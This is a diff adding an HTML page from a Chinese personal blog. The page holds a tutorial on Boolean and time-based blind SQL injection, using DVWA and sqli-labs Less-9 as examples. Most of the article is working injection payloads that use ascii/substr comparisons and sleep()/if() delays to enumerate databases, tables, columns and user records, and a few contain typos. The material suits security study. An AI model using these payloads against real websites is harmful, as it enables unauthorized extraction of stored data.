@@ -1,0 +1,242 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL注入实战之盲注篇（布尔、时间盲注） | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQL注入实战之盲注篇（布尔、时间盲注） | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="首先还是写一下核心的语句吧。
+information_schema
+schemata(schema_name)
+tables(table_schema,table_name)
+columns(table_schema,table_name,..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQL注入实战之盲注篇（布尔、时间盲注）
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-09
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>首先还是写一下核心的语句吧。</p>
+<pre><code>information_schema
+schemata(schema_name)
+tables(table_schema,table_name)
+columns(table_schema,table_name,column_name)
+
+select schema_name from information_schema.schemata;
+select table_name from information_schema.tables where table_schema='dvwa';
+
+select column_name from information_schema.columns where table_schema='dvwa' and table_name='users';
+
+select concat(username,password) from dvwa.users;
+</code></pre>
+<h1 id="布尔盲注">布尔盲注</h1>
+<p>在SQL注入过程中，应用界面仅仅返回True（页面）或者False（页面）。无法根据应用程序的返回页面得到需要的数据库信息。可以通过构造逻辑判断（比较大小）来得到需要的信息。</p>
+<pre><code>select id,name from product where id=1 and 1=1
+</code></pre>
+<h1 id="布尔型盲注步骤和语句">布尔型盲注步骤和语句</h1>
+<p><strong>1.判断当前数据库名长度与数据库名称</strong></p>
+<pre><code>and select length(database())&gt;n  //判断数据库名长度
+and ascii(substr(database(),m,1))&gt;n //截取数据库名第m个字符并转换成ascii码 判断具体值
+</code></pre>
+<p><strong>2.判断数据库的表长度与表名</strong></p>
+<pre><code>and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))&gt;n  //判断第一行表名的长度
+
+and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),m,1))&gt;n  //截取第一行表名的第m个字符串转换为ascii值判断具体为多少
+</code></pre>
+<p><strong>3.判断数据库的字段名长度与字段名称</strong></p>
+<pre><code>and length((select column_name from information_schema.columns where table_name='users' limit 0,1))&gt;n  //判断表名中字段名的长度
+
+adn ascii((substr(select column_name from information_schema.columns where table_name='users' limit 0,1),m,1))&gt;n //截取表中字段的第m字符串转换为ascii值，判断具体值
+</code></pre>
+<p><strong>4.判断字段的内容长度与内容字符串</strong><br>
+and length((select user from users limit 0,1)) &gt;1 //判断字符串内容长度</p>
+<pre><code>and ascii(substr((select user from users limit 0,1),m,1)) //截取第m个字符串转换为ascii值
+</code></pre>
+<p><strong>时间盲注</strong><br>
+在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注<br>
+select id,name from product where id=1 and sleep(2)</p>
+<p><strong>基于时间盲注sleep函数</strong></p>
+<p>-在mysql下，sleep的语法如下：sleep(seconds)即sleep函数代码执行延迟若干秒</p>
+<p>-sleep()函数执行是有条件的，必须保障sql语句执行结果存在数据记录才会停止指定的秒数，如果sql语句查询结果为空，那么sleep函数不会停止</p>
+<p>观察以下语句</p>
+<p>第一个语句：sleep函数设置查询停留3s， sleep函数本身返回值为0，显示查询时间为3s</p>
+<p>第二个语句：语句最后加上and 1=2 形成查询逻辑错误，sleep函数不执行暂停，因此查询时间为0s</p>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1617897678773.png" alt="" loading="lazy"></figure>
+<h1 id="基于时间盲注if函数">基于时间盲注if函数</h1>
+<p><strong>逻辑判断函数if（）</strong></p>
+<pre><code>if（expr1，expr2，expr3） 如果expr1为真，则if函数执行expr2语句，否则if函数执行expr3语句
+
+-select user from users where uer_id=1 and1=if(ascii(substr(database(),1,1))&gt;1,sleep(5),1);
+</code></pre>
+<p>此处 如果条件ascii(substr(database(),1,1))&gt;1成立则执行sleep（5），否则执行1</p>
+<h1 id="基于时间的盲注案例sqli-lab-less-9">基于时间的盲注案例（sqli-lab less-9）</h1>
+<p><strong>枚举当前数据库名</strong></p>
+<pre><code>id =1' and sleep(3) and ascii(substr(database(),m,1))&gt;n --+
+</code></pre>
+<p><strong>枚举当前数据库的表名</strong></p>
+<pre><code>id =1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1))&gt;n and sleep(3) --+
+</code></pre>
+<p><strong>或者利用if函数</strong></p>
+<pre><code>id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) &gt;n,sleep(5),1) --+
+</code></pre>
+<p><strong>枚举当前数据库表的字段名</strong></p>
+<pre><code>id =1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit a,1),m,1))&gt;n and sleep(3) --+
+</code></pre>
+<p><strong>枚举每个字段对应的数据项内容</strong></p>
+<pre><code>id =1' and ascii(substr((select username from security.users limit a,1),m,1))&gt;n and sleep(3) --+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a></li>
+<li><a href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E6%AD%A5%E9%AA%A4%E5%92%8C%E8%AF%AD%E5%8F%A5">布尔型盲注步骤和语句</a></li>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8if%E5%87%BD%E6%95%B0">基于时间盲注if函数</a></li>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E6%A1%88%E4%BE%8Bsqli-lab-less-9">基于时间的盲注案例（sqli-lab less-9）</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/mysql-mang-zhu-ji-yu-shi-jian-yan-chi-zhu-ru-sleep-han-shu/">
+              <h3 class="post-title">
+                MySQL盲注：基于时间延迟注入（Sleep函数）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
